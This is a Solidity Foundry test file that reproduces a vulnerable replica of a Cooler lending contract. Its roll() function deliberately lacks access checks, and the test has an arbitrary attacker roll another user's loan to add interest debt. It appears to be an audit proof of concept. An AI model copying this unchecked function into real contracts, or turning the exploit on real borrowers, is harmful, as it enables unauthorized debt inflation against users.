pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface ERC20 { function transferFrom(address, address, uint256) external returns (bool); function transfer(address, uint256) external returns (bool); }

contract MockERC20 is ERC20 {
    mapping(address => uint256) public balance;
    function mint(address to, uint256 a) external { balance[to] += a; }
    function transferFrom(address from, address to, uint256 a) external returns (bool) {
        if (a > 0) {
            require(balance[from] >= a, "insufficient");
            balance[from] -= a; balance[to] += a;
        }
        return true;
    }
    function transfer(address to, uint256 a) external returns (bool) { balance[to] += a; return true; }
}

// Minimal vulnerable replica
contract Cooler {
    struct Request { uint256 amount; uint256 interest; uint256 loanToCollateral; uint256 duration; bool active; }
    struct Loan { Request request; uint256 amount; uint256 collateral; uint256 expiry; bool rollable; address lender; }

    Request[] public requests;
    Loan[] public loans;

    ERC20 public immutable collateral;
    uint256 private constant decimals = 1e18;

    constructor(address c) {
        collateral = ERC20(c);
        // create a single request + loan to demonstrate roll
        Request memory r = Request({amount: 100, interest: 1e17, loanToCollateral: 1e18, duration: 365 days, active: false});
        requests.push(r);
        uint256 coll = collateralFor(r.amount, r.loanToCollateral);
        loans.push(Loan(r, r.amount, coll, block.timestamp + r.duration, true, address(0)));
    }

    function roll(uint256 loanID) external {
        Loan storage loan = loans[loanID];
        Request memory req = loan.request;

        // simplified checks omitted for brevity to mirror vulnerability
        uint256 newCollateral = collateralFor(loan.amount, req.loanToCollateral) - loan.collateral;
        uint256 newDebt = interestFor(loan.amount, req.interest, req.duration);

        loan.amount += newDebt;
        loan.expiry += req.duration;
        loan.collateral += newCollateral;

        collateral.transferFrom(msg.sender, address(this), newCollateral);
    }

    function collateralFor(uint256 amount, uint256 loanToCollateral) public pure returns (uint256) {
        return amount * decimals / loanToCollateral;
    }
    function interestFor(uint256 amount, uint256 rate, uint256 duration) public pure returns (uint256) {
        uint256 interest = rate * duration / 365 days;
        return amount * interest / decimals;
    }
    // helper to read loan amount
    function loanAmount(uint256 id) external view returns (uint256) { return loans[id].amount; }
}

contract CoolerTest is Test {
    Cooler target;
    MockERC20 coll;
    address attacker;

    function setUp() public {
        coll = new MockERC20();
        target = new Cooler(address(coll));
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_roll() public {
        uint256 before = target.loanAmount(0);
        // compute expected interest added by roll (matches Cooler.interestFor)
        uint256 expected = target.interestFor(before, 1e17, 365 days);

        vm.prank(attacker);
        target.roll(0);

        assertEq(target.loanAmount(0), before + expected);
    }
}

